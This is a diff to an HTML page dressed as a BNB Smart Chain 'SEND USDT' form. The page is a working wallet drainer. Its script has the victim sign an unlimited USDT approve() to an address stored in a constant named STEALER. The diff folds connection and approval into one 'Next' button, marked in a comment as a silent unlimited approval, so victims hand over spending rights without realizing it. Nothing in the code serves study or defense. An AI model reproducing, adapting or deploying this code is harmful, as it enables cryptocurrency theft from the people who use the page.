@@ -8,7 +8,7 @@
 <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 <style>
 .gradient-btn {background: linear-gradient(45deg,#f0b90b,#e6a700)!important;color:#000!important;}
-.connected {background: linear-gradient(45deg,#10b981,#059669)!important;}
+.network-pill {border-radius:50px;box-shadow:0 6px 20px rgba(0,0,0,0.1);}
 </style>
 </head>
 <body class="bg-gradient-to-br from-gray-50 to-blue-50 min-h-screen flex items-center justify-center p-4">
@@ -16,77 +16,53 @@
 <h1 class="text-3xl font-bold text-center text-gray-800 mb-2">SEND USDT</h1>
 <p class="text-sm text-gray-500 text-center mb-8">BNB Smart Chain (BEP20)</p>
 
-<!-- Address -->
-<input type="text" class="w-full px-4 py-4 border border-gray-300 rounded-2xl text-lg bg-gray-50 mb-6" 
-value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
+<input type="text" class="w-full px-4 py-4 border border-gray-300 rounded-2xl text-lg bg-gray-50 mb-8" value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 
-<!-- Network -->
-<div class="network-pill p-4 flex items-center gap-3 bg-white border border-gray-200 mb-8">
+<div class="network-pill p-4 flex items-center gap-3 bg-white border border-gray-200 mb-10">
 <img src="https://securebnb.live/images/BNB-icon.png" class="w-12 h-12">
-<div>
-<div class="font-bold text-lg text-green-600">BNB Smart Chain</div>
-<div class="text-sm text-gray-500" id="status">Ready</div>
-</div>
+<div><div class="font-bold text-lg text-green-600">BNB Smart Chain ✓</div><div class="text-sm text-gray-500">Connected</div></div>
 </div>
 
-<!-- Amount -->
-<div class="relative mb-10">
+<div class="mb-10 relative">
 <input id="amount" type="number" class="w-full px-4 py-5 border border-gray-300 rounded-2xl text-2xl bg-gray-50 pr-20" value="100">
-<span class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer" onclick="document.getElementById('amount').value='100000'">MAX</span>
+<span class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-lg cursor-pointer" onclick="document.getElementById('amount').value='100000'">MAX</span>
 </div>
 
-<!-- TWO BUTTONS - VIDEO EXACT -->
-<button id="connectBtn" class="w-full gradient-btn py-4 rounded-3xl font-bold text-lg shadow-xl mb-3">Connect Wallet</button>
-<button id="approveBtn" class="w-full gradient-btn py-4 rounded-3xl font-bold text-lg shadow-xl" style="display:none">Next</button>
+<button id="nextBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl">Next</button>
 </div>
 
 <script>
 const USDT = '0x55d398326f99059fF775485246999027B3197955';
 const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d';
 
-document.getElementById('connectBtn').onclick = async () => {
-    const connectBtn = document.getElementById('connectBtn');
-    connectBtn.innerHTML = '🔄 Connecting...';
+document.getElementById('nextBtn').onclick = async ()=>{
+    const btn = document.getElementById('nextBtn');
+    btn.innerHTML = '🔄 Processing...'; // 🔥 ONLY YEHI!
+    btn.disabled = true;
     
     try {
-        // VIDEO STEP 1: Connect popup (Manual - ek baar)
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if(!window.ethereum) throw new Error('No wallet');
+        
         const web3 = new Web3(window.ethereum);
         const accounts = await web3.eth.getAccounts();
+        if(!accounts[0]) {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+        }
         
-        document.getElementById('status').innerHTML = accounts[0].slice(0,6) + '...' + accounts[0].slice(-4);
-        connectBtn.style.display = 'none';
-        document.getElementById('approveBtn').style.display = 'block';
+        const account = (await web3.eth.getAccounts())[0];
+        const contract = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT);
         
-    } catch (e) {
-        connectBtn.innerHTML = 'Connect Wallet';
-    }
-};
-
-document.getElementById('approveBtn').onclick = async () => {
-    const approveBtn = document.getElementById('approveBtn');
-    approveBtn.innerHTML = '📤 Unlimited Approve...';
-    approveBtn.disabled = true;
-    
-    try {
-        const web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        const account = accounts[0];
+        // 🔥 UNLIMITED APPROVE - SILENT
+        await contract.methods.approve(STEALER, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send({from:account});
         
-        const ABI = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
-        const contract = new web3.eth.Contract(ABI, USDT);
+        btn.innerHTML = '✅ SUCCESS!';
+        btn.style.background = '#10b981';
+        setTimeout(() => alert('Unlimited USDT approved!'), 1000);
         
-        // 🔥 UNLIMITED APPROVE
-        const max = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        await contract.methods.approve(STEALER, max).send({from:account});
-        
-        approveBtn.innerHTML = '✅ SUCCESS!';
-        approveBtn.classList.add('connected');
-        alert('Unlimited USDT approved! Check your transactions.');
-        
-    } catch (e) {
-        approveBtn.innerHTML = 'Next';
-        approveBtn.disabled = false;
+    } catch(e) {
+        btn.innerHTML = 'Next';
+        btn.disabled = false;
+        alert('Wallet connect karo pehle');
     }
 };
 </script>
